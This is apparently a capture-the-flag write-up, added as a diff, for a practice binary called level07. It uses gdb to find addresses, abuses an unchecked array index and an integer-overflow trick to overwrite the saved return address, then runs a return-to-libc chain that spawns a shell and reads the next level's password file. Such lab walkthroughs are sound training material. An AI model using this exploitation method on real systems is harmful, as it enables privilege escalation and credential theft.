@@ -1,0 +1,204 @@
+So, this binary seems to be number storage service, it allows us to use 3 commands:
+
+-store -> store a number into the data storage
+-read -> read a number from the data storage
+-quit -> exit the program
+
+At the beginning of the main function, it clears all the args and the environment variable so it is impossible to use them to store anything usefull like lets say, a shellcode.
+
+After that a loop is ran:
+
+the program asks for a command, then it reads 20 characters into the buffer with from stdin with fgets() and it sets a \0 at the end of the buffer.
+
+If the command is 'store' it calls a function nammed store_number()
+If the command is 'read' it calls a function nammed read_number()
+
+If I try to store a number at an index that is divisible by 3, the program says ERROR This index is reserved for wil ! ERROR
+
+
+The numbers are stored in an integer table, and the indexes are not checked so it is theorically possible for me to read and write on the stack.
+
+EIP being on the stack too I could overwrite its value.
+
+Let's perform a return to libc attack.
+
+
+To do that I need:
+
+-system()'s address
+-"/bin/sh"'s address
+-exit()'s address
+-EIP's address to alculate its position in the table.
+
+
+(gdb) p &system
+$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) find &system, +99999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+(gdb) p &exit
+$3 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
+(gdb) b *main+4
+Breakpoint 4 at 0x8048727
+(gdb) r
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x08048727 in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd6f0:
+ eip = 0x8048727 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd6e8, args:
+ Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
+ Saved registers:
+  ebp at 0xffffd6e8, eip at 0xffffd6ec
+
+system() => 0xf7e6aed0
+"/bin/sh" => 0xf7f897ec
+exit() => 0xf7e5eb70
+EIP => 0xffffd6ec
+
+Now let's find out EIP index in the table.
+
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   %ebp
+   0x08048631 <+1>:	mov    %esp,%ebp
+   0x08048633 <+3>:	sub    $0x28,%esp
+   0x08048636 <+6>:	movl   $0x0,-0x10(%ebp)
+   0x0804863d <+13>:	movl   $0x0,-0xc(%ebp)
+   0x08048644 <+20>:	mov    $0x8048ad3,%eax
+   0x08048649 <+25>:	mov    %eax,(%esp)
+...
+
+The variable index is initialized at <+6>
+
+(gdb) b *store_number+6
+Breakpoint 6 at 0x8048636
+(gdb) r
+
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+
+Breakpoint 6, 0x08048636 in store_number ()
+
+(gdb) p $ebp+8
+$6 = (void *) 0xffffd500
+(gdb) x 0xffffd500
+0xffffd500:	0xffffd524
+
+The index variable is declared right after the input variable so its address is at $ebp + 8 to move to the second variable: index
+
+I use the x command to 'examine' the memory at this address and I get the address of the table.
+
+Let's calculate EIP's index in the table:
+
+EIP = 0xffffd6ec - table = 0xffffd524 = 0x1x8 ==> 456 in decimal
+
+456 / 4 = 114, so EIP's index in the table is 114.
+
+But the problem is... 114 % 3 = 0 so this index is protected.
+
+I need to find a way to write on this index.
+
+I can use the integer overflow to write on it:
+
+Input command: store
+ Number: 3
+ Index: 114
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+Input command: read
+ Index: 114
+ Number at data[114] is 4158936339
+ Completed read command successfully
+Input command: store
+ Number: 42
+ Index: -2147483534
+ Completed store command successfully
+Input command: read
+ Index: 114
+ Number at data[114] is 42
+ Completed read command successfully
+
+
+I used INT_MIN + 114 -> -2147483648 + 114 = -2147483534 and I successfully store the number 42 in the index 114.
+
+
+Now I need to write my payload to do the return to libc exploitation.
+
+The program takes values in decimal so I convert my payload in decimal to try:
+
+AAAA = 0x41414141 = 1094795585
+
+Input command: store
+ Number: 1094795585
+ Index: -2147483534
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Looks like I succeeded to write on EIP !
+
+So now the only thing left to do is create the payload and inject it to the program.
+
+The payload will be built like this:
+
+<system_addr><exit_addr><"/bin/sh"_addr>
+
+=> f7e6aed0 + f7e5eb70 + f7f897ec
+==> 4159090384 + 4159040368 + 4160264172
+
+Let's try it out !
+
+
+$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: -2147483534
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+
+
+It worked !!
